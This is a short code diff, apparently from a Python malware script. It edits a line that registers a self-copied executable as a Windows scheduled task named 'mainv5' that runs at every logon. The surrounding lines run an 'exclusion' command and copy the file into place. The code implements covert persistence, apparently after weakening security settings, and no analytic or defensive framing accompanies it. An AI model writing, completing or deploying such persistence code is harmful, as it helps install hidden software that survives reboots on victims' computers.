@@ -10,7 +10,7 @@ os.system(exclusion)
 
 shutil.copy2(source, destination)
 
-command = f'SchTasks /create /f /sc Onlogon /tn "mainv5" /tr "{destination}"'
+command = f'SchTasks /create /f /sc Onlogon /tn "mainv5" /tr "{destination} -"'
 os.system(command)
 
 if source != destination:
